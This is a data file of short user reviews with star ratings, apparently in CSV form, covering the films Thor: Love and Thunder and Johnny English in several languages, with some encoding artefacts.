I liked this movie but I also didn't. I liked the story but the acting was extremely embarrassing,3
"Don't watch if you want a ‚Äòserious' superhero film, Love and Thunder is almost a parody of the genre. Watched at the cinema and enjoyed it, watched again at home with my son and loved it. Not every film is designed to be a masterpiece and Marvel need to make content like this to make the MCU accessible to a wider audience.",4
"I would never bother to sit through a visually stunning action film as I find them just plan boring but when combined with goofy comedy, I felt it worked. Plenty of laugh out loud moments. Nearly make me want to possibly watch other Marvels films...",3.5
"I thought the movie was terrible, it was nothing like any of the other marvel movies at all. I felt like I was watching a romcom, there was maybe only 4 or 5 scenes in the whole movie that was any good or funny. I hope marvel doesn't keep making their movies like this!",0.5
It's good. But not the best Thor movie. I don't like that ending. A little bit a boring.,4
A deeply disappointing sequel to taika's previous reinvention of the beloved character Thor. I fear for the future of marvel.,0.5
"To be honest, I laughed multiple times. BUT the problem is, that there was no serious moments. Well there was, but they where cut by some fart- humor, so they actually did not matter. I loved Ragnarok (mostly because of the humor), but still... I would like some serious moments too as there where some in Ragnarok. Yea, humor is nice and it lightens mind and soul, but also in superhero movies, there needs to be serious moments that actually build the character of the protagonist. In this movie, there was not. Thor is a great character and Chris is absolutely the best actor to represent him. But In general there was lot of stupid moments in this movie that made Thor to look just dumb idiot (although powerful one ofc.). I hope this is not the movie Thor will be remembered for...",3
Don't like comedy's. Especially bad comedy's. Need better writers and please make a serious movie not a joke.,2
"Mala pel√≠cula, ridiculizan mucho a un gran super h√©roe, me parece m√°s una parodia, lastima por thor que es un gran personaje",1
"just buffoons! The whole movie wondered how such a character could be made into such a buffoon! The actors' acting is just awful: pathos, show-offs and ridicule",0.5
"This movie tried to be a lot of things, a sci-fi, a comedy, a super hero flic, and a commentary on religion. It fails at all of these. The tone is incredibly inconsistent making the movie feel sour.",1.5
I think they not need a part 4 this is too much that's why give them...,1.5
"I didn't enjoy as much how they handled Thor's character and Lady Thor was a meh for me. It was a good popcorn and pass the time movie but I wasn't as interested. The VFX face sucked, pls give more time to the VFX studios so we can get quality content. I would prefer to wait for something with good visual effects than to have 5 movies/series a year.",3
"The movie has great action scenes, visuals, OST, and to an extent humor, but other than that this movie isn't good at all. Gorr the God Butcher is wasted and needs more screentime mainly because he is shown killing one god on screen, and that's when he becomes the god butcher. The comedic and lighthearted tone of this movie clashed with the dark tone of Gorr a lot too and didn't really fit well into this movie. Some things are also completely illogical like Mighty Thor knowing how to use Mjolnir perfectly and Gorr suddenly going through a character arc in a minute. He also kidnaps some Asgardian children in the movie but his whole idea is that he believes gods only care for themselves so why would he even expect Thor to save them if he thought Thor only cared about himself? The Guardians make a very brief appearance for a brief conversation and a battle as well, which was a shame as I was hoping for them to appear a bit longer before they flew into space.",1
It's pretty funny but a bit annoying in some parts but either way I had a bit of fun with it,4
"The comedy never stops, even when it would be a very good idea for it to. I don't think the film is as bad as many made out, it's nowhere near Thor 2 bad, but it's trying so hard to be funny it misses the ability to feel serious in any way, underusing Christan Bale, who is easily the best actor in the film. That all said, I did laugh, Natalie Portman as Lady Thor does a great job considering how poor I thought the comic version was, I'd even give the film another go. Just maybe not soon.",3
I dont know why they make my brother thor to such a lame dude. Sry. But he is not starlord. Where it is great because it is funny and great written. But this is not good written and not my thor,2.5
"Might be the worst Marvel movie to date. Tired, excessively corny, tonally confused and nonsensical. The only things this movie had going for it was Christian Bale and some stunning visual effects.",2
"Christian bale did phenomenal, but I think the rest of the film is kind of a let down.",2.5
"I don't know what to say ,the good thing of the movie .. Bale ,thats a good actor ,but the character is not a good counterpart to the comic one ... ALL THE REST IS GARBAGE ,the worst comic book movie i ever see ,its like Batman and Robin in the 90s all over again ... Thor is a complex character ,very serious and epic ,thats a good comic character ,not this clown ,this movie is an insult to the character.",0.5
This movie is garbage! I'm the biggest fan of MARVEL but they're going downhill fast! I'm sure Stan Lee is rolling in his grave with the amount of stupid I just had to sit through. Sad! Just so SAD!,0.5
Its not as bad as some say... but its not necessarily good either...,3
Too goofy and over the top with the humor. Ragnarok was a good mix but this was just ridiculous and silly.,2.5
"love and thunder me gusto mucho, una aventura emocionante, con una gran actuacion de casi todos los actores. christian bale hace un muy buen trabajo como gorr al igual que natalie portman como mighty thor, sus chistes que aveces funcionan y aveces no, su soundtrack me encanto y aunque no me gusto la representacion de zeus en esta peli, en lo general me gusto.",4
"It was fun and entertaining enough, witout taking itself too seriously or recycling endlessly the usual superhero movie tropes. The story had a couple of massive plotholes but we've come to expect those from Marvel anyway. Some moments were even good, so much I felt invested in the characters. Acting, classic rock soundtrack, trippy sfx were all good for me.",3.5
"Too heavy on the humor that often misses the mark, too little actual Thor or Gorr, otherwise entertaining, but I would love to see better use of talents like Bale.",3.5
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz,0.5
"This movie turned out to be completely different from what I had expected from the early trailers and pictures. It turned out to be a joke. It felt like I was watching an episode of Rick and Morty. Thor splitting like Jean Claude Van Damme, Screaming Goats, Asgard, Korg - getting more screen time than Gorr, Zeus - what a joke, and many more. This movie seemed like a big mess and it was such a let down. I was laughing by the end when the children were fighting with the powers granted by Thor. The end credit introduction of Hercules was a joke knowing how his father Zeus was (prancing around holding his skirt). I couldn't take that seroiusly, I hope Hercules is ot the same like Zeus. For me this movie was a disgrace to the earlier MCU movies. Tony Stark sacrificed his life for nothing - this phase is cringe.",2
"I am sick and tired of superhero movies but this was really a good one. Yes it has it's flaws like jumping too fast between emotions, unaware cringe comedy.. to crossing long drawn out kids-fantasy immediately into terribly portrayed cancer-theme.. it still hit the marks tho. No in your face wokeness. Great performances by the actors.. and altough I really hate it the movie has no ending hooking us up for more superhero movies at the end..",4
"Love and Thunder's lightheartedness is it's main feature. Sillness of it's somewhat cringey moments are cute and adds an easygoing tone. The plot's shapeless form makes it unpredictable and exciting. Maybe this is the best way forward for certain MCU stories, to make the plot more light-hearted, silly from which the plot has more qualities of a comic book adaptation than a separated entity from it's roots. Visuals are heavenly and that was the golden ticket for this movie. Plot's metaphorical outlook on society is admirable too , there's no genre limitation to remind of reality. Great performances by the cast making the experience a joyous one. Well done.",4
"Minha opini√£o: Este filme vem ap√≥s Ragnarok e j√° neste filme o perfil de Thor era de uma forma s√©ria, mas depois ele mudou e fez Shazan e ficou comico. E esta vers√£o c√¥mica do deus do trov√£o n√£o pegou bem para os f√£s. E creio que neste filme chegue ao fim. Espero. Tanto que se compararmos com Gorr que √© o vil√£o, n√£o teve este lado c√¥mico, tanto que se perguntar quem foi o melhor ator foi o Bale. Mesmo Natalie que √© uma super atriz, deixou a desejar, mas n√£o por culpa dela, e do papel. Agora o papel de Russel todo inchado, feio dizer que √© Zeus, kkkkkk essa foi duro de engolir. E a forma que ele √© vencido. O motivo e a forma que Natalei se tornou Thor, foi meio goela a baixo. Agora entender oque este filme tem a somar com a etapa 4, n√£o sei. Pois Gorr surge de uma vingan√ßa a morte de sua filha e para se vingar encontra a espada que mata deuses. E assim ele come√ßou sua matan√ßa onde o pr√≥prio Zeus temia ele. E assim √© onde une Thor, Natalie, Valkiria e Korg. Al√©m de tentarem serem c√¥micos para aumentar tem as cenas de ci√∫me da Mjolnir e Rompe Tormentas o Machado de Thor. At√© chegar ao cl√≠max final onde ele vai libertar as crian√ßas asgardianas e a luta final. Este estilo c√¥mica acredito que n√£o agradou a grande f√£s do her√≥i, nada haver a Chris. Apesar das partes c√¥micas foram excessivas, no resultado se tivesse um tom mais s√©rio daria uma nota 8,75 com algumas remodelagens no roteiro. Da forma como foi 7. Roteiro: poderia ser bem melhor. Vale apena assistir? Sim Nota: 7",3.5
Entertaining? Yes. Was it great? I‚Äôm afraid no. It had enough entertaining parts to make it worth watching though.,3.5
"In my opinion Thor: Love and Thunder was a very good movie with a great cast and some great action and screenplay. I think when it came to the emotional or serious moments, the film lacked and displayed and favoured comedy, although Christian Bales Gorr the God Butcher arch was very intrusive and gut wrenching, in the end the villain seemingly got what he wanted and kind of became a protaganist as you wanted him to succeed. Overall a great Marvel movie with great action.",4
"It's more of a Marvel parody than a serious movie, but it manages to be charismatic and sprawling, offering a very entertaining experience, with catchphrases that sometimes work, sometimes don't.",3.5
Can't write....zzzz....zzzz....zzzzz,0.5
"Liked the Rock n Roll take it had on it plus it was funny, THOR never miss movies always hit üî•üî•",5
There‚Äôs too much of the director trying to be a show stealer acting in the movie. As well as more laughs than action. Otherwise I find the movie full of heart and better than some say.,3
"It was a Thor movie or ""The Naked Gun"" Valhalla edition? However very nice Christian Bale performance.",2.5
Darn shame. Thor and Gorr deserved better.,0.5
"I don't know about other people but I like this movie very much Maybe people don't know about the story The story of the movie is based on Jane Foster not for thor This is one of the greatest thor movie If you want ranking here it is 1.Thor ragnarok 2,Thor love and thunder 3Thor 4Thor the dark world",5
It's a fun movie with great action scenes. But the story was a bit weak,3.5
I love Marvel movies in general and Thor in particular but this was just awful. The comedy fell flat and the characters lacked the personality they had in previous Thor movies. We had 3 different generations watching this and no one liked it.,1
"Mostly a poor attempt at self-parody that is not very funny; really more a satire. By the time I realized the plot had turned serious, I was no longer invested and had no empathy for the characters or their dilemma. Extra half-star for Christian Bale.",1.5
This was one of the worst movies iv ever seen. The mcu was ruined after endgame with the exception of spiderman. Thor used to be special now I dont care about him because everyone have powers now. They always have to make a female hero to promote feminism. Even the kids are special now. I used to like thor and now I dont care about him whatsoever. The jokes were bad and they were trying too hard. Save yourself from watching this horrible thing.,0.5
The worst Thor movie ever.,0.5
I love Taika Watiti but this is probably his worst film. I was bored by the end. Didnt care for the characters and felt like they were making the story up as they went along. Russel Crowe was a surprising highlight as Zues.,2.5
I love it. Again Thor movies are just the best refreshing and amusing.,5
"maybe too dumb, but it's ok",4
Lament√°vel o caminho que a Marvel est√° seguindo,0.5
"Thor is NOT a comedy. The plot was horrible! Could Jane have had a worse wig? And adding those cartoonish characters is too reminiscent of the disastrous Star Wars Episodes 1-3. The ONLY positive thing about this movie is that the TRUE Thor got back is hair and his buff bod. The writers should be banned from writing any more Thor scripts, otherwise--it's almost too horrible to even think about it--we might end up with THOR THE MUSICAL! ARRRRGGGHHH!",0.5
I loved the last 3 Thor movies but this was a joke. Thor a comedian now or is he still a hero?,2
"me gusta mucho, pero me gustar√≠a que hicieran a Marvel un poco mas serio, uno no se puede tomar enserio la pel√≠cula si cada 5 minutos hay un chiste (a veces muy malo)",3.5
Wack movie is not a thor,0.5
"A very boring ride. I don't know, I simply wasn't compelled and felt sluggish watching it, almost as if I was waiting for it to be over. Enjoyed the end though.",1
Not even Christian Bale was able to safe this movie.,1.5
"A film written and directed by a 12 year old, aimed at 7 year olds. There is no actual character development or consequences. The fight scenes are sub par. The plot is paper thin. What jokes happen are for prepubescent kids. The villain is especially underdeveloped and silly. They took an interesting story from Marvel Comics and turned it into Shiny Things Happen, the end. And to top it all off, it renders IW & EG pointless (Thor could have called all the Gods for help) and Thor actually lets Jane die (he could have given her Thor powers). They make no effort trying to think. The MCU (and Star Wars) was great when they made films for adults that children also loved. Now it's poop jokes and ""boys have cooties"" in between orgy references, lower quality than the latest churned out Minions.",1
The worst MCU movie that can't even decide what genre it wants to be.,0.5
Really good fun. It does make the action very comedic but it still feels like it has stakes at the right moments. My favorite of the Thor films.,4.5
Great movie if you expect a funny movie about Marvel‚Äòs Thor,4
An emotionless ride.expections were high because of it's predecessor and unfortunately they aren't met.film's treats itself as a joke which could be among the unfunniest jokes in the history of mankind.,2
"Filme ruim, pior filme do Thor, acredito que o que eles querem fazer com o Thor √© cada vez fazer um filme pior que o outro, estragaram simplesmente a melhor hist√≥ria do Thor do Gibi, quero #querothorgibi #chegadelacracao",0.5
Just way to over the top with goofyness. We need to get back to that Winter Solider tone please üôè Marvel!,1.5
"I enjoyed it. Another Marvel Maaterpiece. Some set pieces felt rushed, and forced, but it didn't bother me too much. Seriously have no complaints. Thank you Marvel!",4
Is good to pass the time and also to see with kids because have a lot of funny moments that can be enjoy by all the family,3.5
"Aburridisima. Mala por donde se la mire. Con chistes innecesarios todo el tiempo, y malos encima",0.5
"One of the worst movies I've ever seen. Full of crummy attempts at humor every 30 seconds and bickering leading no gravity to any of the situations. Beyond that the cgi is absolutely terrible and the storyline not only makes no sense but is also simply a re-write of ragnarok. Marvel has thoroughly destroyed thor as IP with this movie, I will not be watching anything marvel any time soon after seeing this movie.",1
"Smart, funny and led by a hilarious performance from Rowan Atkinson.",4
"ich finde die ganze Reihe super unterhaltsam und habe alle filme an nur einem Tag geguckt und von allen 3 finde ich zwar ist dasd hier der schw√§chste dennoch nicht schlecht sondern recht gut ,er ist lustig die Storyline ist zwar nicht die beste aber recht lustig und f√ºr 1 und halb stunden ist der film sehr unterhaltsam",4
"This movie is excellently written and laid out. Released in 2003, it follows a man named Johnny English, who wishes to be a ""James-Bond-like"" spy. The only problem is that he's an absolute idiot. Despite his lack of intelligence, this movie was full of laughs and action. The movie started out with a tragic event, resulting in the death of all the spies; except Johnny English. This was a good part of the writing because it allowed Johnny English to be the main character, and fulfill his dream of being a spy. It was now up to Johnny English (and his no common sense brain) and his sidekick Bough to defeat the enemy. The plot of the story is well thought out. Johnny has a hunch on who the villain is, while others doubt his accusation. Johnny is driven by his love for his country, even after being stripped of his privileges because of his commitment to his suspicion. The plot includes lots of action, with gun scenes and Johnny's sports car. As well in James Bond, there is some romance in Johnny English. For some reason, Johnny is attractive to the main girl. I guess the producers intended this to happen, because it's really funny. Johnny is pretty stupid, and not very attractive; yet, he somehow still gets the girl. This seems a bit unrealistic if this was in real life. Like I previously mentioned, the producers intended this to happen. In James Bond, there is always some girl that he falls in love with. So that's what they were going for. Except this time, it's not very realistic. The script writers did an excellent job bringing the audience laughs. A guy who wants to be James Bond, but really has no idea what is going on, is really funny. He makes silly mistakes, and dumb decisions, but still finds himself alive after all these events. Rowan Atkinson is the perfect actor for this. He's so funny, yet acts as though he's stupid. He's such an underrated actor. This movie is a comedic movie, and has a bit of romance. I would definitely recommend this movie to anyone above the age of 10. I don't have many negatives with this movie, apart that it's pretty mature, and shouldn't be watched for younger audiences. I would rate this movie a solid 4.5/5. It's not a perfect movie, I think the filming could have been a bit better, but it is a 2003 movie. Otherwise, a deeply underrated movie.",4.5
"It's a funny film, being made a success by the script from Bond writers Purvis and Wade. Rowan Atkinson should also take a lot of credit for his characterisation. He is sometimes bumbling, but you can also believe that other characters in the film might mistake him for a dangerous spy. It's nice to see Alexander Armstrong playing Bough from Atkinson's Barclaycard adverts and Natalie Imbruglia is just delightful. It surprises me to see the negative reviews and people saying ""it's like Mr Bean"" when this is really a pretty good effort. Two sequels followed, so it can't have been that bad.",4
"A personal favorite and a very funny spoof of the James Bond films, this movie is a must see for Rowan Atkinson fans!",4
007 but with a lower budget.,2.5
"After having watched the sequels first, I don't know how they could actually one up this. It was funny, slightly annoying at times, but still funny.",3.5
"Little ones loved it, all good",5
"If Mr. Bean were an incompetent James Bond! Director Peter Howitt's spy action-comedy Johnny English (2003) holds up surprisingly as a hilarious James Bond spoof. Howitt's frenetic direction blazes through thrilling shootouts and exciting car chases like this was a Mission Impossible movie. Howitt clearly loves and respects James Bond spy thrillers and British espionage thrillers like Michael Caine's The Ipcress File. Johnny English feels similar to The Pink Panther movies with Peter Sellers. From hidden rooms, lethal gadgets, expensive balls, late night infiltrations, international intrigue, and data gathering. Johnny English remains a delightfully fun spy spoof for the entire family. Writers Robert Wade, Neal Purvis, William Davies, and Peter Howitt came up with an insane plot of having a Frenchman steal the crown jewels and claim England's crown monarchy in order to turn the entire British isle into a giant prison. Their writing for the spy games is very clever and funny. I love the constant setup to repeated gags and blunders by the British fool spy Johnny English. It's as much an homage to spies with the nationalistic English message as it is a loving parody of spy films. Johnny English is not all genius, not all high brow, but it's always lighthearted and funny. I've seen it many times and always find laughter. Rowan Atkinson's arrogant and idiotic spy Johnny English is so funny. He's able to be butt of the joke and play up English's endless mistakes and unreal ego. Rowan Atkinson basically plays Johnny English like his iconic bumbling Mr. Bean character, but with a pseudo suave persona like a James Bond. He's definitely trying to be like Timothy Dalton and Pierce Brosnan's James Bonds. Johnny English's steadfast sidekick Bough is amazing with his knowledge of situations and gadgets. Ben Miller's gullible helper Bough is just so funny alongside Atkinson's wretched spy Johnny English. Australian singer and actress Natalie Imbruglia is breathtaking and cool as elegant spy Lorna Campbell. She's so good that she almost convinces you that Lorna could love such an ugly man like Rowan Atkinson. She's effortlessly graceful, gorgeous, and even kills her hand to hand combat. I wish Imbruglia got more serious roles as she's excellent in Johnny English. Her Lorna is a better heroine than Johnny English. John Malkovich is a riot as French billionaire Pascal Sauvage. His greedy Frenchman is pleasant and charming as he carefully plots for the English throne. Greg Wise cameos as the effortless Agent One like a James Bond type. I do like that Johnny English is assigned to the case only because he gets all the other MI7 agents killed. Tasha de Vasconcelos looks lovely in her cute cameo as Countess Alexandra during Johnny English's opening mission. Douglas McFerran and Steve Nicolson's henchmen are really fun with their love of killing and distaste for Johnny English. Kevin McNally's astonished Prime Minister and Tim Pigott-Smith's stern Head of MI7 Pegasus are great characters. Bond girl Nina Young cameos as Pegasus' secretary. Robin Sales' fast editing keeps the energy up and the striking action montages are as stylish as Edgar Wright movies. A lot is packed into 88 minutes. Remi Adefarasin's cinematography is pretty with carefully shot sequences whether Johnny English is breaking and entering or getting outwitted at every turn. Chris Seagers' production looks expensive with several castles and ballrooms. John Bush's lavish set decoration adds production value, while Peter Chiang's CGI effects still look fine for the villain's map and printed money. Composer Ed Shearmur's score mimics, homages, and parodies James Bond music with thrilling intensity. Many of the jokes are elevated by Shearmur's exciting score. I love ABBA so hearing them on the soundtrack is always a joy. Sound designer Glenn Freemantle really lets the music ramp up in the mix. Jill Taylor's slick suits and outstanding dresses look immaculate. Her spy suits and dresses for Natalie Imbruglia alone are stunning. Sallie Jaye, Kate Benton, and Graham Johnston's make-up looks divine on Imbruglia. She glows with a radiance here. In conclusion, Johnny English is a very funny movie, especially if you love spy thrillers!",5
"hilarante simplemente hilarante. esta pel√≠cula es tonta pero se enorgullece y se compromete en ello. una comedia √∫nica en su tipo con un protagonista ic√≥nico personajes carism√°ticos una parodia a las cintas de espionaje. cinematograf√≠a √©pica, musicalizaci√≥n gen√©rica que queda bien en su parodia y escenas de acci√≥n fren√©tica y muy bien echas. ¬øalgo malo? algunas conveniencias de guion 9/10",4.5
"Yes, it's predictable. Yes, the villain sucks. Yet it's so funny, it overshadows all of that.",4
"I do not care for stupid movies, and Johnny English is as stupid as it comes!!",2
"Mediocre and unfunny, one of Rowan Atkinson's most mediocre movies",2.5
"Ok so according to critics this is unfunny. The same critics that think The Last Jedi is a classic film that's better than Revenge of the Sith. This is comedy gold. From the car chase scene, to Agent 1's funeral explosion, to Johnny English being crowned king. I'd rather watch this over a real Bond film, Die Another Day, any day. However, it is not as good as Johnny English Reborn.",3.5
One of my favorite movies - I've watched it hundreds of times because it's always funny to me and even if I know it by heart I always find it interesting.,5
"Agent 007 but of a frightening incompetence, with this banal pretext one could expect a banal and uninspired comedy, instead the film is wonderful and very funny. Throughout the film shines through the genius and simplicity of this beautiful comedy to be watched lightly and that never bores you.",5
Simply hilarious! One of Lexie's top 5 of all time.,5
"I gave this a watch and I thought this would be a good movie, But I was wrong.",0.5
Rowan Atkinson is just the king of comedy!!!,4
"A British classic. Perfect in every way from plot to acting, from comedy to drama",5
A HILLARIOUS spy spoof that has a purposefully nonsensical plot - and nonstop jokes.,3.5
una gran pelicula de espias chistosa poco frecuente,5
"There is nothing wrong with this nor I dislike of some part. It is just a comedy genre of spy movies. At least this movie is not as boring tragedy. The ending is fine, there is wrong nor mistakes of it. (My honest experience).",4.5
"Johnny English doesn't hit well with some predictable jokes and basic story, but with its great cast, passes the time well. I've seen Johnny English twice now, and it isn't that great. It can be fun with its great cast (especially Rowan Aktinson) but its jokes are predictable and unfunny, making a movie that could've been better. Although, many kids (and even adults) may find a few jokes hilarous. Even with some stupid jokes, I couldn't help but giggle at some parts. The story for Johhny English was quite dissapointing though. It is a basic, formula like spy movie and, because the jokes don't always hit, makes (for most people) a boring movie. Overall, Johnny English is a movie that deserves to be watched with your kids over dinner or for a quick movie night, but will most likely leave you not wanting to watch again.",3
I really bland comedy from Rowan Atkinson.,0.5
So good! Easy watching and lots of laughs,5
Rowan Atkinson and Ben Miller are a brilliant pair in this Bond spoof that is bound to put a smile on your face,4
"Perhaps I speak from nostalgia of my childhood, but this film is so much funnier than people give it credit for. Atkinson brilliantly creates a loveable, bumbling caricature who brings joy to the whole viewing experience.",4.5
"Even though the funny moments can sometimes be very predictable, I still laughed at many places and it's a great film to watch if you just want some spoof James Bond action.",4
Rowan Atkinson is the only good thing about this movie. Everything else is cliched spy stuff with predictable and poorly done humor and slapstick comedy. It's also really dated with poor CGI and cheap looking sets. The newer ones are better.,1
"There are hints of Atkinson's great comedic timing from his earlier years, but he is dragged down through some jokes that are just too crude or too predictable to land properly, like a pistol that literally shits. Malkovich returns to Rounders glory with an absolutely terrible accent, but at least it's justified this time around by the genre. Goes from pretty solid ground at times to Austin Powers and back again without bringing it together cohesively. There's still plenty of fun to be had in the longer-running comedy bits, but Blackadder this is not. (2.5/5)",2.5
"Better than I expected, Rowan Atkinson is a riot in the titular role, Ben Miller also does a great job. Some comic scenes are genuinely funny, its a film with lots of hits a few misses. And John Malkovich's over the top portrayal of Pascal Sauvage makes this even better. A fun watch.",3.5
This movie is funny and the family will most likely enjoy it.,3
uninspired but often funny.,3
A funny spy movie that could have been better but still will make the family laugh.,3
"I never took the time to watch any of the Mr. Bean movies, because PG-13 comedy isn't crude enough to entertain me. I was actually surprised with this first Johnny English movie though. Atkins' British humor style of haphazardly bollixing up an extended task [and suffering the lashback of extreme humiliation] is actually funny for half of the film. I was expecting a one star fart, but this was unexpectedly amusing.",3
Physical comedy not bad.,3
A classic spy comedy.,3.5
"I am afraid to tell you, but this movie is rotten to the very core... I am a huge fan of Rowan Atkinson, but this movie isn't good at all. In truth, it is one of the worst movies I have ever seen. I don't advise you to waste your time with this film. Watch something else!",0.5
Atkinson is what makes this film watchable.,3.5
"I can't believe that this has such a low rating - I think it is hilarious (both the film itself and the fact that it has a low rating). That is fine but at least I admit that my views are subjective unlike most of the mentally stunted idiots who have posted on this page giving negative reviews, phrasing their reviews in a way that suggests that they are absolute fact. It has actually infuriated me that the same morons who think that this film is shit are the same people who think that Austin Powers is funny, let alone superior to this. I actually thought to myself - i bet these idiots think that Austin powers is funny just before I read a review on here describing Austin Powers as superior to this (btw all the people who think this are 'Top Critics which I now think is a definite indicator of low I.Q and genreallly being a fat nerd who find crass humour funny. My faith in humanity is gone if I had any before - pls kill me",4.5
"Hilarious. One of the best movies to come from Rowan Atkinson, who we all know is undoubtedly a brilliant comedian. This is certainly the best movie of the 3.",5
"Tiresome and smug vehicle for the Marmite comedic gifts of Rowan Atkinson. You either worship Atkinson (as Working Title clearly do) or find his brand of comedy predictable and overworked. But surely Bond spoofs are a dime a dozen, whichever horse you back.",3
Rowan Atkinson does not fail to make you laugh.,3.5
Was entertaining but just too predictable. Knew he would stuff up every time he got cocky. Good laugh for the kids though.,2.5
'Johnny English' is the dead horse of a tired genre. Rowan Atkinson is basically doing a mixture of Mr. Bean and Blackadder.,2
This film is through and through british. It embrases being a smart and sometimes dumb Comedy. I love it!,3.5
Might be a bit silly but we loved it. Always worth watching Rowan Atkinson - he√¢(TM)s a comic genius!!!,5
Johnny English is one of the few comedies to make me laugh throughout. Atkinson's witty humor and perfect comedic timing makes this film hilarious.,5
"Not the best film, Rowan Atkinson is great, this movie isn't. The beginning is filled with slapstick comedy and is hilarious, while the middle is slow and boring. The world Johnny English is part of wants to be realistic, but the story line will not allow it.",2.5
"This is a type of film that can't be critically looked at, it's just a humorous film that just feels unprofessional but fun.",4
"I didn't have high hopes for Johnny English. After all, there have been so many 007 parodies in the last few years that the genre is oversaturated. (In fact, with Die Another Day, even the ""legitimate"" Bond movies have gotten into the act. That movie was as close to self-parody as the venerable series has gotten since The Man with the Golden Gun.) If there was cause for optimism, however, it had to do with Rowan Atkinson, the gifted British comedian behind such ventures as ""Black Adder"" and ""Mr. Bean."" Sadly, although Atkinson can remove his trousers from underneath a bathing suit on national TV, he can't invigorate this overused premise. Johnny English is a tamer Austin Powers crossed with ""Get Smart,"" with very little in the way of effective humor. In the final analysis, Johnny English isn't just forgettable; it's a waste of time.(Rent Austin Powers instead).",2
Wit and Humour only true intellects will ever get to understand,5
"3.5/5. A fun little spy spoof that may be immature, but it's still funny.",3.5
"What's wrong with having another parody of spy movies? There are so many comedies out there based on sexist jokes, alcohol, parties, etc. that, to me, are not funny at all. I am a big fan of Rowan Atkinson, thanks to Mr. Bean, but also to other performances. There are people who said they did not lough, but there are also people like me who loughs even after watching it at least ten times. Is it funnier in Italian than in English? Maybe, try and let me know.",5
"There is no problem with this film, its a fun ride for all Atkinson fans",4
"It wasn't worth paying for a ticket. Some funny moments, but wait till it comes out on DVD.",3
"Non c'√® un granch√© da dire su questo primo film; fa diciamo il suo dovere ovvero far ridere e divertire le persone e ci riesce. Spassosa la scena al Sushi, Rowan Atkinson √® perfetto per il ruolo. Ho trovato un po' esagerato il finale, anche per il genere di film che vuole essere ed √®. Mi sono divertito.",2.5
"Brilliant film and one that ai frequently watch again and again, critics clueless as usual but what's new there. Great plot really enjoyed it and it's hilarious",5
Johnny English is one of the few comedies to make me laugh throughout. Atkinson's witty humor and perfect comedic timing makes this film hilarious.,5
Our family LOVES this movie. Rowan Atkinson does a fantastic job portraying Johnny English. We have been a fan of his since his old Mr. Bean episodes on PBS.,5
"It's competent, but predictable - well made for what it is, but not hilarious and often the farce is too obvious.",3.5
"Genious. One of Rowan Aktinson's best performaces. Amazing plot, amazing movie.",5
Stupied comedy but I'm not expecting nothing more. Watch only for few really nice jokes.,2
I absolutely love this film; never gets old!,5
its has everything humour action emotion kind of its great,5
Rowan Atkinson's witty charm and comedic timing is always fun!,5
"It may be too silly and occasionally gross, however, that can be overlooked mostly thanks to Rowan Atkinson's hilarious portrayal.",3
Amazing this is funny and I hope number 3 happens,5
"Johnny English can be funny when it wants to and Rowan Atkinson seems awfully committed to the role. The Robbie Williams song is oddly amusing as well although I wouldn't put it on a Top 10 list of theme songs from soundtracks of non-James Bond spy movies. However, the short runtime means that there isn't as much room for laughs as there should be whilst the titular character's ineptitude involving unintentionally making a spectacle of himself at a funeral and later at a hospital can be more facepalm worthy. It can work when it wants to but the action sequences aren't quite as entertaining as they should be. An occasionally humorous albeit very uneven spy spoof. I'd say stick with Austin Powers but I haven't watched any one of the films yet and besides, even if I did watch it prior to me doing this review, one of the Super Reviewers beat me to it. Can't win them all, man, can't win them all.",3
"I'd love to see a 'by country' breakdown of these reviews. My prediction: if you're American, you're likely to hate this; if you're from pretty much anywhere else, you'll find it hilarious. This is a magnificently funny, witty, and clever movie and Rowan Atkinson is not only born for the role but would have made a good Bondi!",5
I thought it was really funny when I saw it.,3.5
"The film delivers a few good laughs and ok acting, but that doesn't cover for the unoriginal plot, overdone clich√©s and cringey moments, however, if you want a family film that everyone can enjoy, I recommend it.",2.5
"Love it, hilarious , funny",4.5
"One of my favourites, Rowan Atkinson always makes me laugh",4.5
"Despite a few funny moments, Johnny English mostly makes you groan and cringe.",1.5
It's a funny film that I think is very underrated. If this hadn't come after Austin Powers this would be much better received by fans and critics alike. Atkinson is funny and Malkovich is brilliant as the villain. There were quite a few scenes were I was almost in tears with laughter. Although the plot wasn't always as well knit together as it could have been but still a solid entry into the parody spy genre.,4
"Everyone loves Rowan Atkinson , but the story and the accidents that happen in this film are far from logical",2.5
"""Johnny English"" (essentially ""Mr. Bean Becomes a Secret Agent"") is everything that you would expect from a Rowan Atkinson spy film. When a bomb blows up all of England's competent MI7 agents, the only agent left alive is Johnny English. Few things go right during his missions throughout the film and when they do, it is usually by accident. Even though Atkinson is best known for his classic Mr. Bean character, I think that his physical comedy is even funnier when paired with his dry delivery of dialogue. Plus, there are several moments when you can't help but picture Zazu from ""The Lion King"" delivering the lines! From his fight with an imaginary assailant to his slurred dialogue after accidentally drugging himself , Atkinson's comedic genius breathes life into this otherwise run of the mill spy parody. One of the most unexpected pieces of this puzzle is that Natalie Imbruglia is a surprisingly good actress. I assumed that her fame began and ended with her one-hit wonder song ""Torn"" but after seeing her act, I would love to see her in more films. I also have to throw John Malkovich's name out there because he always makes a great villain! I appreciated the use of Handel's ""Zadok the Priest"" to give the coronation scene a sense of authenticity and Robbie Williams' song ""A Man for All Seasons"" left me in a great mood during the ending credits. The critics may not have liked ""Johnny English"" but this goofball spy parody is an enjoyable break from dramatic movies that take themselves too seriously.",3.5
"There are some great sight gags, and Mr. Bean does some of his usual antics. But by the end, even Malcovic's outrageous French accent runs a little thin.",3
"While not the greatest Bond spoof, Johnny English has enough witty lines and dramatic moments to make it memorable, as well as some very nice stunts.",3.5
Occasionally funny send up of spy flicks.,3
"This film is hilarious :D so under-rated, would defo recommend !",5
"Really pants film, silly in an unimaginable way, like as example of you was going to be crowned the following day you wouldn't spend the night before in grace, a different country.. √∞¬§"" haven't watched this since I was younger and thought I would enjoy reliving this. I was deeply disappointed. Maybe I'm looking too much into this but it's just crap..",0.5
"Yet another James Bond satire but with one redeeming fator, Rowan Atkinson, who's jokes were pretty funny. You've got to get inside the ego of J.E. to get that the jokes are not just slapstick but actually all about him trying to convince everybody that he can do James Bond even though he can't and he knows it. I know a few people like this in real life, they are not so funny.",2.5
